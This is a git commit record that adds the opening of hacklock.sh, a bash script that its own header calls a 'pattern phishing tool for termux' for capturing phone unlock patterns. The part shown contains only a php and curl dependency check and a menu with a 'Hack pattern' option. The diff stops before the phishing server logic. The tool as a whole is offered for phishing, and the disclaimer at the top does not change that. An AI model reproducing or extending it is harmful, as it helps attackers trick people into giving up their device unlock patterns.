f22a04faab7f478703f07a5537660ff83f0e1bc0
Aveng-hacker <61612610+sujoybiswas@users.noreply.github.com>
2020-05-05 15:33:58 +0000

    Create hacklock.sh

---
+++ hacklock.sh
@@ -0,0 +1,38 @@
+#!/bin/bash
+# Hacklock by Nitro
+#youtube.com/noobhackers
+#not for illegel use
+#pattern phishing tool for termux no root.
+
+clear
+echo
+echo
+echo
+echo
+echo
+trap 'printf "\n";stop;exit 1' 2
+
+
+dependencies() {
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+
+}
+
+menu() {
+
+printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Hack pattern\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m About\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m3\e[0m\e[1;92m]\e[0m\e[1;93m Update\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m4\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option
+
+
+if [[ $option == 1 || $option == 01 ]]; then
+server="pattern"
+start1
+
+elif [[ $option == 2 || $option == 02 ]]; then
+echo
+cd $HOME/hacklock/core/about/
